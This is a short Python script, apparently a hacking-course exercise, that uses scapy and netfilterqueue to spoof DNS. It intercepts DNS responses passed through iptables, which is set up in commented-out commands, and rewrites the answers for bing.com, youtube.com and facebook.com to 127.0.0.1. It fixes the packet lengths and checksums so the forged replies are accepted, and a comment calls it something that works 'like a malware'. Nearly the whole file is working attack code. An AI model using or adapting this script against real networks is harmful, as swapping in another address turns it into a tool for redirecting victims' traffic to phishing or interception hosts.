#yean this work on local machine like a malware
import scapy.all as scapy
import netfilterqueue 

# subp.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
# subp.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) 
    if scapy_packet.haslayer(scapy.DNSRR):
       qname = scapy_packet[scapy.DNSQR].qname
       list_qnames = ['www.bing.com.','www.youtube.com.','www.facebook.com.']
       qname_d = qname.decode("utf")
       print(qname_d)
       if qname_d in list_qnames:
            answer = scapy.DNSRR(rrname=qname_d,rdata='127.0.0.1')
            print(qname_d)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            #by using below lines scapy packet donot curroupt
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(bytes(scapy_packet))
    # else:
    #     print("nahi hai nahi hai DNSRR nahi hai")
    # # if scapy_packet.haslayer(scapy.IP):
    # #     ip_name = scapy_packet[scapy.IP].dst 
        #print(scapy_packet.show())
    packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0 , process_packet)
queue.run() 
#subp.call('sudo iptables -F',shell=True)